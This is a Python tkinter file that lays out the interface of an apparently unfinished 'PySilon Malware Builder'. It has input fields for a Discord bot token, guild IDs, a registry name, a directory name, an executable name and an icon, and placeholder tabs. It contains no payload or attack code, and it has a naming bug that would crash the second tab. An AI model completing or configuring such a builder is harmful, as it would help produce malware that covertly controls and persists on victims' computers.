import tkinter as tk
from tkinter import ttk
import tkinter.font as tkFont
from PIL import Image, ImageTk

class Builder:
    def __init__(self, master):
        self.master = master
        self.master.title("PySilon Malware Builder")

        self.create_buttons()

        self.canvas = tk.Canvas(self.master, bg="#0A0A10", border=0, highlightthickness=0)
        self.canvas.place(x=0,y=40,width=700,height=460)

        self.configuration = {
            'token': '',
            'guild_ids': '',
            'registry_name': '',
            'directory_name': '',
            'executable_name': '',
            'icon_path': ''
        }

        self.general_settings_click()

    def create_buttons(self):
        self.button_frame = tk.Frame(self.master)
        self.button_frame.place(x=0, y=0, width=700, height=40)

        self.general_settings_button = tk.Button(
            self.button_frame,
            text='General Settings',
            font=tkFont.Font(family='Consolas', size=10),
            disabledforeground='white',
            command=self.general_settings_click
            )
        self.general_settings_button.place(x=0, y=0, width=135, height=40)

        self.functionality_settings_button = tk.Button(
            self.button_frame,
            text='Functionality Settings',
            font=tkFont.Font(family='Consolas', size=10),
            disabledforeground='white',
            command=self.functionality_settings_click
            )
        self.functionality_settings_button.place(x=135, y=0, width=175, height=40)

        self.compiling_settings_button = tk.Button(
            self.button_frame,
            text='Compiling Settings',
            font=tkFont.Font(family='Consolas', size=10),
            disabledforeground='white',
            command=self.compiling_settings_click
            )
        self.compiling_settings_button.place(x=310, y=0, width=145, height=40)

        self.pysilon_logo = tk.Label(
            self.button_frame,
            text='PySilon',
            font=tkFont.Font(family='Elephant', size=24)
            )
        self.pysilon_logo.place(x=549, y=-7)

        self.pysilon_sublogo = tk.Label(
            self.button_frame,
            text='M  A  L  W  A  R  E',
            font=tkFont.Font(family='Elephant', size=5),
            fg='red'
            )
        self.pysilon_sublogo.place(x=590, y=27, width=70)

        vertical_separator = ttk.Separator(self.button_frame, orient='vertical')
        vertical_separator.place(x=455, y=0, height=40, width=1)

        horizontal_separator = ttk.Separator(self.button_frame, orient='horizontal')
        horizontal_separator.place(x=455, y=39, height=1, width=245)
        
    def draw_initial_content(self):
        self.canvas.create_text(200, 150, text="Initial Content", font=("Helvetica", 16), fill="black")

    def general_settings_click(self):
        self.general_settings_button['state'] = tk.DISABLED
        self.general_settings_button['relief'] = 'flat'
        self.functionality_settings_button ['state'] = tk.NORMAL
        self.functionality_settings_button['relief'] = 'groove'
        self.compiling_settings_button['state'] = tk.NORMAL
        self.compiling_settings_button['relief'] = 'groove'
        self.canvas.delete("all")

        self.token_label = tk.Label(self.canvas, text='BOT Token:', font=tkFont.Font(family='Consolas', size=16))
        self.token_label.place(x=220, y=80, anchor=tk.E)
        self.token_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16))
        self.token_entry.place(x=220, y=80, width=400, anchor=tk.W)
        self.token_entry.insert(0, self.configuration['token'])

        self.guildids_label = tk.Label(self.canvas, text='*Guild IDs:', font=tkFont.Font(family='Consolas', size=16))
        self.guildids_label.place(x=220, y=110, anchor=tk.E)
        self.guildids_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16))
        self.guildids_entry.place(x=220, y=110, width=400, anchor=tk.W)
        self.guildids_entry.insert(0, self.configuration['guild_ids'])

        self.registry_label = tk.Label(self.canvas, text='Registry Name:', font=tkFont.Font(family='Consolas', size=16))
        self.registry_label.place(x=220, y=140, anchor=tk.E)
        self.registry_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16))
        self.registry_entry.place(x=220, y=140, width=400, anchor=tk.W)
        self.registry_entry.insert(0, self.configuration['registry_name'])

        self.directory_label = tk.Label(self.canvas, text='Directory Name:', font=tkFont.Font(family='Consolas', size=16))
        self.directory_label.place(x=220, y=170, anchor=tk.E)
        self.directory_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16))
        self.directory_entry.place(x=220, y=170, width=400, anchor=tk.W)
        self.directory_entry.insert(0, self.configuration['directory_name'])

        self.executable_label = tk.Label(self.canvas, text='Executable Name:', font=tkFont.Font(family='Consolas', size=16))
        self.executable_label.place(x=220, y=200, anchor=tk.E)
        self.executable_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16))
        self.executable_entry.place(x=220, y=200, width=400, anchor=tk.W)
        self.executable_entry.insert(0, self.configuration['executable_name'])

        self.icon_label = tk.Label(self.canvas, text='Icon:', font=tkFont.Font(family='Consolas', size=16))
        self.icon_label.place(x=220, y=230, anchor=tk.E)


    def functionality_settings_click(self):
        self.general_settings_button['state'] = tk.NORMAL
        self.general_settings_button['relief'] = 'groove'
        self.functionality_settings_button ['state'] = tk.DISABLED
        self.functionality_settings_button['relief'] = 'flat'
        self.compiling_settings_button['state'] = tk.NORMAL
        self.compiling_settings_button['relief'] = 'groove'
        self.canvas.delete("all")

        self.token_label.destroy()
        self.guildid_label.destroy()

        self.canvas.create_text(200, 150, text="Content for Button 2", font=("Helvetica", 16), fill="green")

    def compiling_settings_click(self):
        self.general_settings_button['state'] = tk.NORMAL
        self.general_settings_button['relief'] = 'groove'
        self.functionality_settings_button ['state'] = tk.NORMAL
        self.functionality_settings_button['relief'] = 'groove'
        self.compiling_settings_button['state'] = tk.DISABLED
        self.compiling_settings_button['relief'] = 'flat'
        self.canvas.delete("all")
        self.canvas.create_text(200, 150, text="Content for Button 3", font=("Helvetica", 16), fill="red")

def main():
    root = tk.Tk()
    Builder(root)
    root.geometry("700x500")
    root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
    root.mainloop()

if __name__ == "__main__":
    main()
